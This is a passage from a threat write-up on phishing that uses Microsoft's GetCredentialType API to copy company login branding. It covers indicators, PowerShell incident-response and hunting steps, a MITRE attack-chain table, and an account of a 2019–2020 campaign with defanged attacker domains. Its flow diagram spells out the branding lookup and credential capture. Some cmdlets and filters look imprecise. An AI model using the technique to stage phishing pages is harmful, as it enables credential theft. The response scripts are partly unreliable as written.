## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Technical IOCs:**

- **Sign-ins from Firebase, Azure Blob Storage, AWS S3 IP ranges** (phishing page source)
- **Bulk GetCredentialType API calls from external IPs** (enumeration phase)
- **Sign-ins immediately followed by mailbox forwarding rule creation** (persistence)
- **MFA method additions without prior MFA challenge** (account modification by attacker)
- **Inbox rules that move emails to Archive and mark as read** (evasion of detection)
- **Large bulk email downloads via Graph API** (data exfiltration)

**Behavioral IOCs:**

- **Sign-in from cloud provider IP followed by email access** (indicates phishing-to-access chain)
- **Multiple failed sign-in attempts followed by success** (credential stuffing or spray attack)
- **Sign-ins from impossible locations** (same user from distant countries within minutes)

### Forensic Artifacts

**Cloud Logs:**

- **Sign-In Logs:** Entries with cloud provider IPs (Firebase, Azure Blob, AWS)
- **Audit Logs:** "New-InboxRule", "Set-InboxRule", "Add-MFADevice" created by attacker
- **Graph Activity:** Bulk email downloads, file enumeration, Teams data access
- **Unified Audit Log:** Credential changes, MFA method additions, forwarding rules

**Network/DNS:**

- **DNS queries to attacker infrastructure** (branding proxy servers like rohstofff[.]de)
- **HTTP requests to Firebase, Azure Blob Storage** (phishing page hosting)
- **HTTP POST requests to attacker-backend** (credential exfiltration)

### Response Procedures

**Immediate Actions (0-15 minutes):**

1. **Revoke User Sessions:**

```powershell
# Revoke all active sessions for compromised user
Revoke-AzureADUserAllRefreshToken -ObjectId (Get-MgUser -Filter "userPrincipalName eq 'alice@company.com'").Id
```

2. **Reset Password:**

```powershell
# Force password reset on next sign-in
Update-MgUser -UserId "alice@company.com" -ForceChangePasswordNextSignIn $true
```

3. **Remove Malicious Inbox Rules:**

```powershell
# Remove rules that might have been created by attacker
Get-InboxRule -Mailbox "alice@company.com" | `
  Where-Object { $_.Actions -contains "Archive" } | `
  Remove-InboxRule -Confirm:$false
```

4. **Revoke MFA Methods (if attacker added methods):**

```powershell
# Remove any suspicious MFA methods
Get-MgUserAuthenticationMethod -UserId "alice@company.com" | `
  Where-Object { $_.DisplayName -like "*new*" -or $_.DisplayName -like "*secondary*" } | `
  Remove-MgUserAuthenticationMethod
```

**Containment (15-60 minutes):**

5. **Investigate Compromised Accounts:**

```powershell
# Check recent activity
$activity = Search-UnifiedAuditLog -UserIds "alice@company.com" -StartDate (Get-Date).AddDays(-1) | `
  Select-Object UserIds, Operations, CreatedDate | `
  Sort-Object CreatedDate -Descending | `
  Select-Object -First 50

$activity | Export-Csv -Path "C:\Investigation\alice_activity.csv"
```

6. **Identify Phishing Page Source:**

```powershell
# Search for links in phishing emails
$phishingEmails = Search-UnifiedAuditLog -Operations "SuspiciousActivity" | `
  Where-Object { $_.AuditData -like "*firebase*" -or $_.AuditData -like "*blob.core*" }

# Extract and block URLs
$phishingEmails | ForEach-Object {
  $data = ConvertFrom-Json $_.AuditData
  Write-Host "[!] Phishing URL: $($data.Url)"
}
```

**Recovery (1-24 hours):**

7. **Monitor for Lateral Movement:**

```powershell
# Check if attacker used compromised account to target other users
Get-TransportRule | Where-Object { $_.Name -like "*Forward*" }

# Search for emails sent to external domains
Search-UnifiedAuditLog -UserIds "alice@company.com" -Operations "Send" | `
  Where-Object { $_.AuditData -like "*external*" }
```

8. **Threat Hunt for Similar Compromises:**

```powershell
# Find other users with signs of phishing
$suspiciousUsers = Get-MgAuditLogSignIn -Filter "createdDateTime gt 2025-05-10" | `
  Where-Object { $_.IPAddress -like "35.192*" -or $_.IPAddress -like "13.107*" } | `
  Select-Object -ExpandProperty UserPrincipalName | `
  Sort-Object -Unique

Write-Host "[!] Found $($suspiciousUsers.Count) users signing in from cloud provider IPs"
$suspiciousUsers | ForEach-Object { Write-Host "    $_" }
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | T1589 (Gather Victim Identity Info) | Attacker enumerates target organizations via LinkedIn, public employee directories |
| **2** | **Credential Access** | **[IA-PHISH-004]** | **Attacker uses GetCredentialType API to retrieve company branding, creates phishing pages** |
| **3** | **Initial Access** | T1566.002 (Phishing: Spearphishing Link) | Attacker sends phishing emails with links to branding-poisoned pages |
| **4** | **Credential Access** | T1110 (Brute Force) | If phishing succeeds, attacker obtains valid credentials |
| **5** | **Persistence** | T1098 (Account Manipulation) | Attacker creates inbox rules, adds MFA methods, establishes persistence |
| **6** | **Impact** | T1537 (Transfer Data to Cloud Account) | Attacker exfiltrates emails, files, Teams data; performs BEC campaigns |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: eSentire Campaign Discovery (2019-2020)

**Discovery:** eSentire's threat research team (TRU)

**Timeline:** First observed June 2019; attacks confirmed as recent as March 2020

**Methodology:**

1. Attackers queried GetCredentialType API with target organization email addresses
2. Retrieved organization logos, backgrounds, and custom text
3. Hosted phishing pages on Firebase Storage, Azure Blob Storage, AWS S3
4. Created backend PHP servers to proxy branding requests and collect credentials
5. Sent bulk phishing emails with links to Firebase-hosted pages

**Attacker Infrastructure Identified:**

| Domain | First Seen | Last Seen |
|--------|-----------|-----------|
| rohstofff[.]de | September 2019 | February 2020 |
| rnln-fs[.]com | October 2019 | January 2020 |
| hismhyrot[.]xyz | October 2019 | November 2019 |
| numis[.]ml | November 2019 | November 2019 |
| xericlandxanthippelady[.]com | September 2019 | November 2019 |
| dorregocompany[.]com | October 2019 | November 2019 |
| vvangon[.]com | October 2019 | November 2019 |

**Attack Pattern:**

```
┌─────────────────────────────────────────────┐
│ 1. Attacker identifies target organization  │
│    (e.g., acme-corp.com)                    │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│ 2. Query GetCredentialType API              │
│    POST /common/GetCredentialType           │
│    {"Username":"admin@acme-corp.com"}       │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│ 3. Retrieve Branding Assets from Microsoft  │
│    Logo: https://secure.aadcdn....          │
│    Background: https://secure.aadcdn....    │
│    Text: "Welcome to Acme Corporation"      │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│ 4. Create Phishing Page with Branding       │
│    Host on Firebase: phishing-app.firebaseapp.com │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│ 5. Send Phishing Email                      │
│    To: acme employees                       │
│    Subject: Verify Account                  │
│    Link: https://phishing-app.firebaseapp.com │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│ 6. Victim Sees Familiar Branding            │
│    Logo: Acme logo (from Microsoft CDN)     │
│    Background: Acme background              │
│    Text: "Welcome to Acme Corporation"      │
│    => User cannot distinguish from real!    │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│ 7. Victim Enters Credentials                │
│    Username: alice@acme-corp.com            │
│    Password: MyPassword123                  │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│ 8. Attacker Captures Credentials            │
│    Stored in rohstofff[.]de database        │
│    + IP Address, User Agent, Timestamp      │
└─────────────────────────────────────────────┘
```

**Impact:**

- 13+ attacker-controlled infrastructure domains identified
- Dozens of organizations targeted
- Credentials harvested for dozens of employees
- Full mailbox access and data exfiltration

**References:**

- [eSentire - Company Branding Phishing Research](https://www.esentire.com/blog/new-bolo-phishing-attacks-that-customize-o365-pages-with-your-branding)

---

### Example 2: Ongoing Exploitation (2024-2025)

**Current Status:** Technique remains ACTIVE

**Evidence:**

- LinkedIn discussions document fresh phishing attempts with custom branding (2024)
- Organizations report phishing emails with exact company logos and colors
- Branding poisoning attacks continue despite awareness

**Why Still Effective:**

- GetCredentialType API remains unauthenticated and accessible
- Users still cannot visually distinguish legitimate from fake pages
- Custom branding deployments continue to increase
- Cloud services (Firebase, Azure Blob Storage) used as hosting, improving credibility

**Future Trend:**

- Microsoft is implementing CSP (Content Security Policy) restrictions beginning mid-2026 to block unauthorized scripts
- This will reduce but not eliminate the attack (static HTML pages will still work)
- User training and URL validation remain critical long-term mitigations

---
